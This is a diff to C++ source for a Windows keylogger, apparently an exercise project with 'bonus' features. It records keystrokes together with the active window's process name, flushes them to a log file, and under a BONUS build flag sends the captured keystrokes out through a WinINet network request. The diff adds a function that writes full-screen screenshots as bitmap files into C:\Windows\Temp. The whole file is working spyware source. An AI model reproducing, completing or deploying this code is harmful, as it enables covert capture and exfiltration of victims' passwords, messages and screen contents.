@@ -8,6 +8,8 @@
 #define _UNICODE
 #define UNICODE
 #pragma comment(lib, "User32.lib")
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "gdi32.lib")
 #pragma warning(push)
 #pragma warning(disable : 4820)
 #include <windows.h>
@@ -19,7 +21,6 @@
 #include <memory>
 #include <sstream>
 #include <string>
-#pragma comment(lib, "wininet.lib")
 
 // ============================================================================
 // CONFIGURATION
@@ -27,7 +28,6 @@
 constexpr size_t MAX_BUFFER_CHARS = 5000;
 constexpr UINT FLUSH_TIMER_ID = 1;
 constexpr UINT FLUSH_TIMER_INTERVAL_MS = 60000;
-
 // ============================================================================
 // GLOBAL STATE
 // ============================================================================
@@ -53,6 +53,7 @@ static KeyloggerState g_state;
 // ============================================================================
 // UTILITY FUNCTIONS
 // ============================================================================
+#ifdef BONUS
 void sendRequest(const std::wstring &message)
 {
 
@@ -85,6 +86,7 @@ void sendRequest(const std::wstring &message)
     InternetCloseHandle(hUrl);
     InternetCloseHandle(hInternet);
 }
+#endif
 
 void LogEvent(const std::wstring &message)
 {
@@ -112,10 +114,68 @@ std::wstring FormatTimestamp(const SYSTEMTIME &st)
                st.wHour, st.wMinute, st.wSecond);
     return buffer;
 }
+#ifdef BONUS
+bool doScreenshot(const std::wstring fileName)
+{
+    HDC hScreen = GetDC(nullptr);
+    HDC hMemDC = CreateCompatibleDC(hScreen);
+
+    int width = GetSystemMetrics(SM_CXSCREEN);
+    int height = GetSystemMetrics(SM_CYSCREEN);
+
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
+    SelectObject(hMemDC, hBitmap);
+
+    // Copie écran → bitmap
+    BitBlt(hMemDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
+
+    BITMAP bmp;
+    GetObject(hBitmap, sizeof(BITMAP), &bmp);
+
+    BITMAPINFOHEADER bi{};
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = bmp.bmWidth;
+    bi.biHeight = bmp.bmHeight;
+    bi.biPlanes = 1;
+    bi.biBitCount = 32;
+    bi.biCompression = BI_RGB;
+
+    DWORD bmpSize = static_cast<DWORD>(bmp.bmWidth) *
+                    static_cast<DWORD>(bmp.bmHeight) *
+                    4;
+    BYTE *pixels = new BYTE[bmpSize];
+
+    GetDIBits(hMemDC, hBitmap, 0, static_cast<UINT>(bmp.bmHeight),
+              pixels, (BITMAPINFO *)&bi, DIB_RGB_COLORS);
+
+    HANDLE hFile = CreateFileW(
+        fileName.data(), GENERIC_WRITE, 0, nullptr,
+        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+
+    BITMAPFILEHEADER bfh{};
+    bfh.bfType = 0x4D42; // BM
+    bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+    bfh.bfSize = bfh.bfOffBits + bmpSize;
+
+    DWORD written;
+    WriteFile(hFile, &bfh, sizeof(bfh), &written, nullptr);
+    WriteFile(hFile, &bi, sizeof(bi), &written, nullptr);
+    WriteFile(hFile, pixels, bmpSize, &written, nullptr);
+
+    CloseHandle(hFile);
+
+    delete[] pixels;
+    DeleteObject(hBitmap);
+    DeleteDC(hMemDC);
+    ReleaseDC(nullptr, hScreen);
+
+    return true;
+}
+#endif
 
 // FLUSH BUFFER TO FILE
 // ============================================================================
-void FlushBuffer()
+void FlushBuffer(void)
 {
     // OutputDebugStringW(L">>> FlushBuffer() called");
 
@@ -128,12 +188,17 @@ void FlushBuffer()
     std::wstring timestamp = FormatTimestamp(g_state.bufferStartTime);
 
     LogEvent(timestamp + L" - " + g_state.currentProcessName + L"\n" + g_state.keystrokeBuffer + L"\n");
+#ifdef BONUS
     sendRequest(g_state.currentProcessName + L" : " + g_state.keystrokeBuffer);
+#endif
     OutputDebugStringW(L"Buffer flushed successfully to file");
 
     // Clear buffer
     g_state.keystrokeBuffer.clear();
     g_state.currentBufferSize = 0;
+#ifdef BONUS
+    doScreenshot(L"C:\\Windows\\Temp\\" + std::to_wstring(std::time(nullptr)) + L".bmp");
+#endif
 }
 
 std::wstring GetActiveProcessName()
@@ -141,12 +206,7 @@ std::wstring GetActiveProcessName()
     HWND hwnd = GetForegroundWindow();
 
     if (hwnd == 0)
-    {
-        // wchar_t buf[40];
-        // swprintf_s(buf, L"GetForegroundWindow failed\n");
-        // LogEvent(buf);
-        return (L"Unknown");
-    }
+        return L"Unknown";
 
     wchar_t windowTitle[1024] = {0};
     GetWindowText(hwnd, windowTitle, _countof(windowTitle));
